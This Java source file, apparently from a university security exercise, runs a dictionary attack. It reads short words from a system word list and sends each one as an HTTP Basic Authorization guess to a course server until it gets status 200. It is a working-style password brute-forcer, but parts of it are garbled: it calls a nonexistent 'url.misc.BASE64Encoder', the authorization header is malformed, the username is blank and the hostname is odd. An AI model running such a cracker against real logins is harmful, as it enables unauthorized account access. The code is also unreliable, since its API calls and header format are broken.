import java.io.*;
import java.net.*;
import java.util.*;


public class Dictionary
{
	public static void main (String args[])
	{
		
		
        Calendar cal = Calendar.getInstance();
        Date now=cal.getTime();
        double startTime = now.getTime();

		String password=getPassword(startTime);
		System.out.println("The password is " + password);
	}

	public static String getPassword(double startTime)
	{
		String password="";
		int requests=0;

		try
		{
			
			FileReader fRead = new FileReader("/usr/share/lib/dict/words");
			BufferedReader buf = new BufferedReader(fRead);

			password=buf.readLine();

			while (password != null)
			{
				
				if (password.length()<=3)
				{
					requests++;
					if (testPassword(password, startTime, requests))
						return password;
				}

				password = buf.readLine();

			}
		}
		catch (IOException ioe)
		{

		}

		return password;
	}

	private static boolean testPassword(String password, double startTime, int requests)
	{
		try
		{
			
			
			URL url=new URL("http://sec-crack.cs.rmit.edu./SEC/2/");

			HttpURLConnection connection;

    		String userPassword =  ":" + password;

    		
    		String encoding = new url.misc.BASE64Encoder().encode (userPassword.getBytes());

			try
			{
				
				connection = (HttpURLConnection) url.openConnection();
				
				connection.setRequestProperty("Authorization", " " + encoding);

				
				int status=connection.getResponseCode();

				System.out.println(password + requests);

				if (status==200)
				{
					System.out.println("It took " + getTime(startTime) + " milliseconds  find the password.");
					System.out.println(" were " + requests + " requests .");

					return true;
				}

				return false;

			}

			catch (IOException ioe)
			{
				System.out.print(ioe);
				return false;
			}

		}

		catch (IOException MalformedURLException)
		{
			System.out.print("Invalid URL");
			return false;
		}
	}


	private static double getTime(double startTime)
	{
		
		
        Calendar cal = Calendar.getInstance();
        Date now=cal.getTime();
        double endTime = now.getTime();

        return endTime-startTime;

	}

}
